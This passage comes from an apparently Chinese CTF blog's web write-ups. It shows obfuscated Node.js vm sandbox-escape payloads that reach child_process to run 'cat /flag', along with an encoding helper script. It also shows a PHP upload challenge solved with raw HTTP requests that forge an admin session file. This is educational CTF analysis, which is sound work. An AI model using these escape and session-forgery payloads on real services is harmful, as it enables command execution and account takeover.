class="string">`mainModule`</span>][[<span class="string">`r`</span>,<span class="string">`e`</span>,<span class="string">`q`</span>,<span class="string">`u`</span>,<span class="string">`i`</span>,<span class="string">`r`</span>,<span class="string">`e`</span>][<span class="string">`join`</span>](<span class="string">``</span>)]([<span class="string">`c`</span>,<span class="string">`h`</span>,<span class="string">`i`</span>,<span class="string">`l`</span>,<span class="string">`d`</span>,<span class="string">`_`</span>,<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`c`</span>,<span class="string">`e`</span>,<span class="string">`s`</span>,<span class="string">`s`</span>][<span class="string">`join`</span>](<span class="string">``</span>))[[<span class="string">`e`</span>,<span class="string">`x`</span>,<span class="string">`e`</span>,<span class="string">`c`</span>,<span class="string">`S`</span>,<span class="string">`y`</span>,<span class="string">`n`</span>,<span class="string">`c`</span>][<span class="string">`join`</span>](<span class="string">``</span>)](<span class="string">`cat flag`</span>)[<span class="string">`toString`</span>](); &#125; &#125;)()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>chamd5 <a href="https://mp.weixin.qq.com/s/ih2X8IXVFmrMVwJYuf5gng" target="_blank" rel="noopener">解法</a></p>
<ul>
<li>利用base64编码绕过关键字的过滤</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">global[[<span class="string">`eva`</span>,%<span class="number">20</span><span class="string">`l`</span>].join(<span class="string">``</span>)](Buffer.from(<span class="string">`VHlwZUVycm9yLnByb3RvdHlwZS5nZXRfcHJvY2VzcyA9IGYgPT4gZi5jb25zdHJ1Y3RvcigicmV0dXJuIHByb2Nlc3MiKSgpOwp0cnkgewogICAgT2JqZWN0LnByZXZlbnRFeHRlbnNpb25zKEJ1ZmZlci5mcm9tKCIiKSkuYSA9IDE7Cn0gY2F0Y2ggKGUpIHsKICAgIGUuZ2V0X3Byb2Nlc3MoKCkgPT4geyB9KS5tYWluTW9kdWxlLnJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjU3luYygiY2F0IC9mbGFnIikudG9TdHJpbmcoKTsKfQ==`</span>,%<span class="number">20</span><span class="string">`base64`</span>).toString(<span class="string">`ascii`</span>));</span><br></pre></td></tr></table></figure>

<ul>
<li>利用hex绕过</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">TypeError</span>[<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">121</span>,<span class="number">112</span>,<span class="number">101</span>)][<span class="string">`\x67\x65\x74\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72`</span>](<span class="string">`\x72\x65\x74\x75\x72\x6e\x20\x70\x72\x6f\x63\x65\x73\x73`</span>)();<span class="keyword">try</span>&#123;<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span> e[<span class="string">`\x67\x65\x74\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>](<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require((<span class="string">`\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>))[<span class="string">`\x65\x78\x65\x63\x53\x79\x6e\x63`</span>](<span class="string">`cat /flag`</span>).toString();&#125;&#125;)()</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		Buffer.from(<span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">			getOwnPropertyDescriptor()&#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72`</span>](<span class="string">`\x72\x65\x74\x75\x72\x6e\x20\x70\x72\x6f\x63\x65\x73\x73`</span>)();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;));</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">		<span class="keyword">return</span> e(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">`\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>)[<span class="string">`\x65\x78\x65\x63\x53\x79\x6e\x63`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure>
</blockquote>
<p>附上自己编的hex编码脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(string)</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        result += str(ord(i))</span><br><span class="line">        result += <span class="string">","</span></span><br><span class="line">    <span class="keyword">return</span> result[<span class="number">0</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"String.fromCharCode("</span>+fun(<span class="string">"prototype"</span>)+<span class="string">")"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(string)</span>:</span></span><br><span class="line">	result = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">		result += <span class="string">"\\x"</span></span><br><span class="line">		result += i.encode(<span class="string">"hex"</span>)</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"`"</span>+fun(<span class="string">"get_process"</span>)+<span class="string">"`"</span></span><br></pre></td></tr></table></figure>

<h1 id="0x03-babyupload"><a href="#0x03-babyupload" class="headerlink" title="0x03 babyupload"></a>0x03 babyupload</h1><p>题目直接给了源码，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">"/var/babyctf/"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"/flag"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] ===<span class="string">'admin'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=<span class="string">'/var/babyctf/success.txt'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] =<span class="string">'guest'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$direction = filter_input(INPUT_POST, <span class="string">'direction'</span>);</span><br><span class="line">$attr = filter_input(INPUT_POST, <span class="string">'attr'</span>);</span><br><span class="line">$dir_path = <span class="string">"/var/babyctf/"</span>.$attr;</span><br><span class="line"><span class="keyword">if</span>($attr===<span class="string">"private"</span>)&#123;</span><br><span class="line">    $dir_path .= <span class="string">"/"</span>.$_SESSION[<span class="string">'username'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($direction === <span class="string">"upload"</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file($_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid upload'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.<span class="string">"/"</span>.$_FILES[<span class="string">'up_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_path .= <span class="string">"_"</span>.hash_file(<span class="string">"sha256"</span>,$_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\.\.\/|\.\.\\\\)/'</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid file path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir($dir_path, <span class="number">0700</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>],$file_path))&#123;</span><br><span class="line">            $upload_result = <span class="string">"uploaded"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'error while saving'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException $e) &#123;</span><br><span class="line">        $upload_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ($direction === <span class="string">"download"</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $filename = basename(filter_input(INPUT_POST, <span class="string">'filename'</span>));</span><br><span class="line">        $file_path = $dir_path.<span class="string">"/"</span>.$filename;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\.\.\/|\.\.\\\\)/'</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid file path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists($file_path)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'file not exist'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        header(<span class="string">'Content-Type: application/force-download'</span>);</span><br><span class="line">        header(<span class="string">'Content-Length: '</span>.filesize($file_path));</span><br><span class="line">        header(<span class="string">'Content-Disposition: attachment; filename="'</span>.substr($filename, <span class="number">0</span>, <span class="number">-65</span>).<span class="string">'"'</span>);</span><br><span class="line">        <span class="keyword">if</span>(readfile($file_path))&#123;</span><br><span class="line">            $download_result = <span class="string">"downloaded"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'error while saving'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException $e) &#123;</span><br><span class="line">        $download_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先开启了session机制，初始设置<code>$_SESSION[&#39;username&#39;]=&#39;guest&#39;</code>如果<code>$_SESSION[&#39;username&#39;] ===&#39;admin&#39;</code>而且<code>/var/babyctf/success.txt</code>这个文件存在，就可以输出flag，然后看接下来的部分，通过direction可以设置上传或下载，有上传和下载的功能，上传需要自己伪造上传表单，文件路径通过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$file_path = $dir_path.<span class="string">"/"</span>.$_FILES[<span class="string">'up_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">$file_path .= <span class="string">"_"</span>.hash_file(<span class="string">"sha256"</span>,$_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]);</span><br></pre></td></tr></table></figure>

<p>来拼接，下载文件的文件名</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$filename = basename(filter_input(INPUT_POST, <span class="string">'filename'</span>));</span><br><span class="line">$file_path = $dir_path.<span class="string">"/"</span>.$filename;</span><br></pre></td></tr></table></figure>

<p>通过他来拼接，$dirpath为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$attr = filter_input(INPUT_POST, <span class="string">'attr'</span>);</span><br><span class="line">$dir_path = <span class="string">"/var/babyctf/"</span>.$attr;</span><br><span class="line"><span class="keyword">if</span>($attr===<span class="string">"private"</span>)&#123;</span><br><span class="line">    $dir_path .= <span class="string">"/"</span>.$_SESSION[<span class="string">'username'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后分析得到解题步骤如下：</p>
<ol>
<li>下载sess_xx文件，获取服务端sess保存机制。</li>
<li>上传文件伪造admin的session，取得伪造后的PHPSESSID，</li>
<li>通过attr上传success.txt文件夹。</li>
<li>修改cookie，刷新界面</li>
</ol>
<p>首先下载服务器端sess_xx文件</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419165506846.png" alt="image-20200419165506846"></p>
<p>文件内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usernames:5:&quot;guest&quot;;&#x2F;&#x2F;有一个不可见字符为0x08</span><br></pre></td></tr></table></figure>

<blockquote>
<p>后来得知后端php采用的是php_binary的session保存机制，键名长度对应的asc字符  键名   serialize后的字符串</p>
</blockquote>
<p>然后本地搭建环境，修改源码输出文件保存的路径</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419165338104.png" alt="image-20200419165338104"></p>
<p>发包；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;hf&#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.35.158</span><br><span class="line">Content-Length: 318</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;192.168.35.158</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.35.158&#x2F;hf&#x2F;upload.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Cookie: PHPSESSID&#x3D;gijbgl5915bkhhlu6ldn446u3l</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;direction&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;up_file&quot;; filename&#x3D;&quot;sess&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">usernames:5:&quot;admin&quot;;</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0--</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419165647345.png" alt="image-20200419165647345"></p>
<blockquote>
<p>这里的文件名也可以以另一种方法获得，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_binary'</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'username'</span>] = <span class="string">'admin'</span>;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后查看tmp目录，对应得生成得sess文件如下图：</p>
<img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200420162317571.png" alt="image-20200420162317571" style="zoom:200%;">

<p>然后直接计算hash值</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200420162432734.png" alt="image-20200420162432734"></p>
</blockquote>
<p>然后向服务器端上传文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 6a26ba086a9d4a20a30b6f98d683123677f302903f364ff8.changame.ichunqiu.com</span><br><span class="line">Content-Length: 318</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;e663f4c6b5e24170b6528d6d8b672a197f04b6d3d4ce4f7e.changame.ichunqiu.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.35.158&#x2F;hf&#x2F;upload.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Cookie: PHPSESSID&#x3D;gijbgl5915bkhhlu6ldn446u3l</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;direction&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;up_file&quot;; filename&#x3D;&quot;sess&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">usernames:5:&quot;admin&quot;;</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0--</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419165744260.png" alt="image-20200419165744260"></p>
<p>可以检测一下文件是否上传成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 6a26ba086a9d4a20a30b6f98d683123677f302903f364ff8.changame.ichunqiu.com</span><br><span class="line">Content-Length: 312</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;e663f4c6b5e24170b6528d6d8b672a197f04b6d3d4ce4f7e.changame.ichunqiu.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Cookie: PHPSESSID&#x3D;gijbgl5915bkhhlu6ldn446u3l</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;direction&quot;</span><br><span class="line"></span><br><span class="line">download</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;filename&quot;</span><br><span class="line"></span><br><span class="line">sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0--</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419170141101.png" alt="image-20200419170141101"></p>
<p>之后通过attr建立success.txt文件夹，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 6a26ba086a9d4a20a30b6f98d683123677f302903f364ff8.changame.ichunqiu.com</span><br><span class="line">Content-Length: 420</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;e663f4c6b5e24170b6528d6d8b672a197f04b6d3d4ce4f7e.changame.ichunqiu.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.35.158&#x2F;hf&#x2F;upload.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Cookie: PHPSESSID&#x3D;gijbgl5915bkhhlu6ldn446u3l</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;direction&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;attr&quot;</span><br><span class="line"></span><br><span class="line">success.txt</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;up_file&quot;; filename&#x3D;&quot;sess&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">usernames:5:&quot;admin&quot;;</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0--</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419165832078.png" alt="image-20200419165832078"></p>
<p>然后修改cookie，刷新界面。</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419165937895.png" alt="image-20200419165937895"></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>长亭公开课——Shellcode&amp;ROP</title>
    <url>/2020/04/17/shellcoderop/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">输入密码，查看文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="5e8bf91821fa643a68054cbaa06a7ba8fc7a95d83cc479caa48ea190383132dc">00e9038a83f323a6dcc5e2217c465d173cb609081c2d981389969805b9c5216f28ede759063af403306393c2e802db0ac1d3ec7485024277554cfb749b5e0a32d6ea59e56b4befa6ffeca9b2836d7b814a89389d9cac23f6b4efcb1264e89ebb87209b008cf19c3de07d7f0f0d5f1744d4112431d571663f9bbea15c07b9a6341720a18a84f2ec9d75ea2fbbfeb1b0519e2cd3626e681cb706400e55d6b8468a454b6e19589fe9ed29333c44cf8d6f5324993dc7e2af53bfe0a11c7c7704db64d49be691d548cba4b6c4b3c8d95963e81393cead0d6c08bec37720c9c1d65358bbc3b1fd62d3db162de810bbf73b07071eb7ea619a8b992c69528a2b5970d2c4e8662b7b7ede001c26172970725d06c12e9ea8f8d014ee8106ae35e239e336e403c6c23e9590eaa7654b1236c120ff4062654381f00f68b33d3cf80fb86de7525f9c5c4fd3298cc730b074b39aebf41a51dd6b9714e1306188b36a72b960e99e92131d84997935ae617c6a5e919824a29300a310810992bc33be9afa5c357d6e4d05e9fd08445bb580948183feb04063f3f3f83544cd1641df037ed930e6a933573f0271ccb039d908e0cc418c74177dd0fc967be5abc85f027240b6fd426e6364775d9c0fdc0bebaa46e2e90d61902a3abfad758ef5ee9c47ad910d5c34074043a4fdb9285a6fa2656321b3593d63a6093590931ccfcdd6db7262a01989001157022ebf257389c4be8fa4b5451037ec45c9ab9d3ee9b6bd1eb3252f16064e316034e6b043eb910e34d7c4bab49db6f304e2c233d886bb0d013a172d58778053e661d5e11969eb78fecbc8ae8223d5b5ff0125f6af323995a5cc8337f7ec0b3d69abaf9fdc163d1f7e13b5e077c9b3b3147d6df368f219e0c78877227d4b6a286ed9522b1183afeecc0147463e75d9574b214609250ceb6f84ba09627eb777e9892cf374bd26d1c59532c1be6e502dcc7a7e99923b7080ef8c5e2423b3f9dbaaab00ceebb40a1d2ae24fcfbdde2fb31c5491aae74756b5611ae146fcd9c3582ad75afa8e1b3853344cb784ca455b9af81c75c8400348dd2aa03a7378bb7f90c64ce5d01e57240d99d23316338aed5259e2361cdffebeb96fde858753be550e25c33a5fafd5afaf53d5d58973429389c3f82aeb332608bd4614bc518f07bc2913fcf19b96a446a06ea527462f24cbf4532a342f6d4408f7264d823cf217cb557d7c0cfd070d05100fd0a0ef26f14a030f522c83599aadd46b09de8cb4efc139ee3c17a11bfe01a619918561d5d17987c6429377e95a9aa2ea08b7c31180c565cfd5ed750923c41cc4baa2e1ba9bfbede41bfb033c9c756b87e3b3b3e9